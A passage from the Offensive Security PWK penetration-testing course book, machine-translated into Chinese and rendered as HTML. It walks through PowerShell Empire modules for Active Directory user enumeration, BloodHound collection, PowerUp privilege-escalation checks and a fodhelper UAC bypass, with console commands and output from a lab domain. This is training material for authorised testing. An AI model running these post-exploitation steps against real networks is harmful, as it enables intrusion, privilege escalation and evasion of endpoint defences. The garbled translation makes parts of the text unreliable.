<div style="position:absolute;top:138730;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查询指定用户或指定用户的信息</font></font></nobr></div>
<div style="position:absolute;top:138747;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域。</font><font style="vertical-align: inherit;">PowerView 的一部分。</font></font></nobr></div>
<div style="position:absolute;top:138780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注释：</font></font></nobr></div>
<div style="position:absolute;top:138797;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Reco</font></font></nobr></div>
<div style="position:absolute;top:138814;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无/</font></font></nobr></div>
<div style="position:absolute;top:138848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:138882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:138882;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必填值说明</font></font></nobr></div>
<div style="position:absolute;top:138899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:138899;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">——————————————————</font></font></nobr></div>
<div style="position:absolute;top:138916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域    </font></font></nobr></div>
<div style="position:absolute;top:138916;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的    </font></font></nobr></div>
<div style="position:absolute;top:138916;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于查询的域，    </font></font></nobr></div>
<div style="position:absolute;top:138933;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认为当前域。    </font></font></nobr></div>
<div style="position:absolute;top:138950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP过滤器    </font></font></nobr></div>
<div style="position:absolute;top:138950;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的    </font></font></nobr></div>
<div style="position:absolute;top:138950;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定一个 LDAP 查询字符串  </font></font></nobr></div>
<div style="position:absolute;top:138967;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于过滤 Active Directory 对象。</font></font></nobr></div>
<div style="position:absolute;top:138984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器时间限制 False    </font></font></nobr></div>
<div style="position:absolute;top:138984;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定最长时间</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:139043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">724 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PowerShellEmpire，2019 年），https://github.com/PowerShellEmpire/PowerTools</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:139171;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="118"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 118 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:139204;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:140281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:140281;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:140281;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">735</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:139300;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器花费搜索。</font><font style="vertical-align: inherit;">默认值 120</font></font></nobr></div>
<div style="position:absolute;top:139316;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">秒。    </font></font></nobr></div>
<div style="position:absolute;top:139333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找一个    </font></font></nobr></div>
<div style="position:absolute;top:139333;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的    </font></font></nobr></div>
<div style="position:absolute;top:139333;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只返回一个结果对象。    </font></font></nobr></div>
<div style="position:absolute;top:139350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TrustedToAuth 错误    </font></font></nobr></div>
<div style="position:absolute;top:139350;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转变。</font><font style="vertical-align: inherit;">返回计算机对象</font></font></nobr></div>
<div style="position:absolute;top:139368;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信任其他人的身份验证    </font></font></nobr></div>
<div style="position:absolute;top:139384;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">校长。    </font></font></nobr></div>
<div style="position:absolute;top:139401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PreauthNotRequired False    </font></font></nobr></div>
<div style="position:absolute;top:139401;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转变。</font><font style="vertical-align: inherit;">使用“Do   </font></font></nobr></div>
<div style="position:absolute;top:139418;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不需要 Kerberos 预身份验证” </font></font></nobr></div>
<div style="position:absolute;top:139435;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">放。    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:139452;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理人    </font></font></b></nobr></div>
<div style="position:absolute;top:139452;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></b></nobr></div>
<div style="position:absolute;top:139452;left:360"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S2Y5XW1L 代理运行模块。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:139469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器    </font></font></nobr></div>
<div style="position:absolute;top:139469;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的    </font></font></nobr></div>
<div style="position:absolute;top:139469;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定活动目录服务器    </font></font></nobr></div>
<div style="position:absolute;top:139486;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（域控制器）绑定到    </font></font></nobr></div>
<div style="position:absolute;top:139503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:139522;left:338"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 836 - Get_User 模块信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:139552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，这个较长的 Empire 命令中的换行符没有正确换行。</font><font style="vertical-align: inherit;">这只是一个</font></font></nobr></div>
<div style="position:absolute;top:139571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示问题，不会影响我们输入的命令。</font></font></nobr></div>
<div style="position:absolute;top:139604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们来看看上面清单中的标题部分。</font><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语言</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域</font></font></nobr></div>
<div style="position:absolute;top:139623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是不言自明的。</font></font></nobr></div>
<div style="position:absolute;top:139656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NeedsAdmin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字段设置为“True”，则脚本需要本地管理员权限。</font><font style="vertical-align: inherit;">如果</font></font></nobr></div>
<div style="position:absolute;top:139676;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpsecSafe</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字段设置为“True”，脚本将避免留下妥协指标，例如</font></font></nobr></div>
<div style="position:absolute;top:139695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为临时磁盘文件或新用户帐户。</font><font style="vertical-align: inherit;">这种隐身驱动的方法更有可能</font></font></nobr></div>
<div style="position:absolute;top:139715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">逃避端点保护机制。</font></font></nobr></div>
<div style="position:absolute;top:139747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MinLanguageVersion</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字段描述的PowerShell的最低版本要求执行</font></font></nobr></div>
<div style="position:absolute;top:139766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">剧本。</font><font style="vertical-align: inherit;">这在使用 Windows 7 或 Windows Server 2008 R2 时尤其重要</font></font></nobr></div>
<div style="position:absolute;top:139786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 版本 2 附带的目标。</font></font></nobr></div>
<div style="position:absolute;top:139819;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后台</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">告诉我们模块是否在后台执行而受害者不可见，而</font></font></nobr></div>
<div style="position:absolute;top:139838;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果模块将输出返回到文件，</font><i><font style="vertical-align: inherit;">OutputExtension 会</font></i><font style="vertical-align: inherit;">告诉我们输出格式。</font></font></nobr></div>
<div style="position:absolute;top:139871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 836 中有几个选项。在这个特定的模块中，除了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Agent</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（</font><i><font style="vertical-align: inherit;">代理）</font></i><font style="vertical-align: inherit;">之外的所有选项</font></font></nobr></div>
<div style="position:absolute;top:139890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已设置）是可选的，模块将按原样工作，枚举目标 Active 中的所有用户</font></font></nobr></div>
<div style="position:absolute;top:139910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录。</font></font></nobr></div>
<div style="position:absolute;top:139942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以设置任意数量的过滤选项或</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块，如清单 837 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:139977;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt; (powershell/situational_awareness/network/powerview/get_user) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font></font></b></nobr></div>
<div style="position:absolute;top:139994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作开始：LP1URA</font></font></nobr></div>
<div style="position:absolute;top:140028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:140045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专有名称：CN=Jeff_Admin,OU=Admins,OU=CorpUsers,DC=corp,DC=com</font></font></nobr></div>
<div style="position:absolute;top:140062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象类    </font></font></nobr></div>
<div style="position:absolute;top:140062;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：{顶部，人员，组织人员，用户}</font></font></nobr></div>
<div style="position:absolute;top:140079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示名称    </font></font></nobr></div>
<div style="position:absolute;top:140079;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：杰夫_管理员</font></font></nobr></div>
<div style="position:absolute;top:140096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lastlogontimestamp : 2/19/2019 8:15:57 PM</font></font></nobr></div>
<div style="position:absolute;top:140113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名：jeff_admin@corp.com</font></font></nobr></div>
<div style="position:absolute;top:140130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:140130;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：杰夫_管理员</font></font></nobr></div>
<div style="position:absolute;top:140147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象标识    </font></font></nobr></div>
<div style="position:absolute;top:140147;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: S-1-5-21-3048852426-3234707088-723452474-1104</font></font></nobr></div>
<div style="position:absolute;top:140164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同名    </font></font></nobr></div>
<div style="position:absolute;top:140164;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：杰夫管理员</font></font></nobr></div>
<div style="position:absolute;top:140181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员人数    </font></font></nobr></div>
<div style="position:absolute;top:140181;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 1</font></font></nobr></div>
<div style="position:absolute;top:140198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码页    </font></font></nobr></div>
<div style="position:absolute;top:140198;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 0</font></font></nobr></div>
<div style="position:absolute;top:140215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相同帐户类型    </font></font></nobr></div>
<div style="position:absolute;top:140215;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：用户对象</font></font></nobr></div>
<div style="position:absolute;top:140232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户到期    </font></font></nobr></div>
<div style="position:absolute;top:140232;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">： 绝不 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:140359;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="119"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 119 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:140392;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:141469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:141469;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:141469;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">736</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:140488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cn    </font></font></nobr></div>
<div style="position:absolute;top:140488;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：杰夫_管理员</font></font></nobr></div>
<div style="position:absolute;top:140504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">何时改变    </font></font></nobr></div>
<div style="position:absolute;top:140504;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 2/19/2019 下午 7:15:57</font></font></nobr></div>
<div style="position:absolute;top:140521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实例类型    </font></font></nobr></div>
<div style="position:absolute;top:140521;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 4</font></font></nobr></div>
<div style="position:absolute;top:140538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们创造的    </font></font></nobr></div>
<div style="position:absolute;top:140538;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 12613</font></font></nobr></div>
<div style="position:absolute;top:140556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象引导    </font></font></nobr></div>
<div style="position:absolute;top:140556;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 7bbdcd8c-e139-478c-86dd-abdef0f71d58</font></font></nobr></div>
<div style="position:absolute;top:140572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后注销    </font></font></nobr></div>
<div style="position:absolute;top:140572;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 1/1/1601 1:00:00 上午</font></font></nobr></div>
<div style="position:absolute;top:140589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象类别    </font></font></nobr></div>
<div style="position:absolute;top:140589;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com</font></font></nobr></div>
<div style="position:absolute;top:140606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dscorepropagationdata : {2/19/2019 1:05:25 PM, 2/19/2019 12:56:22 PM, 1/1/1601 12:00:0</font></font></nobr></div>
<div style="position:absolute;top:140623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成员    </font></font></nobr></div>
<div style="position:absolute;top:140623;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: CN=域管理员,CN=用户,DC=corp,DC=com</font></font></nobr></div>
<div style="position:absolute;top:140640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:140660;left:360"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 837 - 执行模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了 PowerView 子类中的枚举工具，situational_awareness</font></font></nobr></div>
<div style="position:absolute;top:140708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类别还包括各种网络和端口扫描器。</font></font></nobr></div>
<div style="position:absolute;top:140741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警犬</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块尤为引人注目。</font><font style="vertical-align: inherit;">它使 PowerView 的大部分功能自动化，</font></font></nobr></div>
<div style="position:absolute;top:140760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集域中的所有计算机、用户和组以及所有当前登录的用户。</font></font></nobr></div>
<div style="position:absolute;top:140780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出存储在适用于后端</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BloodHound</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">725 的</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CSV 文件</font><font style="vertical-align: inherit;">中</font></font></nobr></div>
<div style="position:absolute;top:140799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用图论</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">726</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">突出显示 Active 中经常被忽视和高度复杂的攻击路径</font></font></nobr></div>
<div style="position:absolute;top:140819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录环境。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:140853;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:140853;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭证和权限提升</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">privesc</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类别包含特权升级模块。</font><font style="vertical-align: inherit;">更有趣的模块之一</font></font></nobr></div>
<div style="position:absolute;top:140910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个组中是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powerup/allchecks</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">727</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它使用了几种基于错误配置的技术，例如</font></font></nobr></div>
<div style="position:absolute;top:140930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为未引用的服务路径、对服务可执行文件的不当权限等等。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:140965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：powershell/situational_awareness/network/powerview/get_user）&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">usemodule powe</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:140981;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rshell/privesc/powerup/allchecks</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:141015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：powershell/privesc/powerup/allchecks）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font></font></b></nobr></div>
<div style="position:absolute;top:141033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作开始：N459AD</font></font></nobr></div>
<div style="position:absolute;top:141066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 运行 Invoke-AllChecks</font></font></nobr></div>
<div style="position:absolute;top:141117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 正在检查用户是否在具有管理权限的本地组中...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:141134;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 用户位于授予管理权限的本地组中！</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:141151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 运行 BypassUAC 攻击以提升管理员权限。</font></font></nobr></div>
<div style="position:absolute;top:141168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:141187;left:316"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 838 - 使用 PowerUp allchecks 模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:141217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bypassuac_fodhelper</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们有机会获得本地管理员帐户模块是非常有用的。</font></font></nobr></div>
<div style="position:absolute;top:141236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据本地 Windows 版本，此模块可以绕过 UAC 并启动高完整性</font></font></nobr></div>
<div style="position:absolute;top:141256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell Empire 代理：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:141290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: S2Y5XW1L) &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">usemodule privesc/bypassuac_fodhelper</font></font></font></b></nobr></div>
<div style="position:absolute;top:141325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：powershell/privesc/bypassuac_fodhelper）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:141379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">725 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（BloodHoundAD，2019），https://github.com/BloodHoundAD/BloodHound</font></font></font></nobr></div>
<div style="position:absolute;top:141399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">726 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（安迪·罗宾斯，2017 年），https://neo4j.com/blog/bloodhound-how-graphs-changed-the-way-hackers-attack/</font></font></font></nobr></div>
<div style="position:absolute;top:141419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">727 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PowerShellEmpire，2019 年），https://www.powershellempire.com/?page_id=378</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:141547;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="120"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 120 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:141580;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:142657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:142657;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:142657;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">737</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:141692;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：Invoke-FodHelperBypass</font></font></nobr></div>
